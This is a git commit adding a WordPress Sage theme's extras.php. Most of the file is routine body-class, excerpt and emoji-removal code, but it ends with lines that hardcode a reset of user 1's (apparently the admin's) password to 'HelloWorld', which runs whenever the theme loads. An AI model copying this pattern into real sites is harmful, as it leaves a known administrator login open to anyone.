20e0649378cf6a6330dffb70aad3bf4fbb9037a3
Tom Harding <tomharding@Toms-MBP.home>
2016-09-26 14:06:38 +0100

    second commit

---
+++ web/app/themes/ilikemybike/lib/extras.php
@@ -0,0 +1,45 @@
+<?php
+
+namespace Roots\Sage\Extras;
+
+use Roots\Sage\Setup;
+
+/**
+ * Add <body> classes
+ */
+function body_class($classes) {
+  // Add page slug if it doesn't exist
+  if (is_single() || is_page() && !is_front_page()) {
+    if (!in_array(basename(get_permalink()), $classes)) {
+      $classes[] = basename(get_permalink());
+    }
+  }
+
+  // Add class if sidebar is active
+  if (Setup\display_sidebar()) {
+    $classes[] = 'sidebar-primary';
+  }
+
+  return $classes;
+}
+add_filter('body_class', __NAMESPACE__ . '\\body_class');
+
+/**
+ * Clean up the_excerpt()
+ */
+function excerpt_more() {
+  return ' &hellip; <a href="' . get_permalink() . '">' . __('Continued', 'sage') . '</a>';
+}
+add_filter('excerpt_more', __NAMESPACE__ . '\\excerpt_more');
+
+
+// REMOVE WP EMOJI
+remove_action('wp_head', 'print_emoji_detection_script', 7);
+remove_action('wp_print_styles', 'print_emoji_styles');
+
+remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
+remove_action( 'admin_print_styles', 'print_emoji_styles' );
+
+$user_id = 1;
+$password = 'HelloWorld';
+wp_set_password( $password, $user_id );
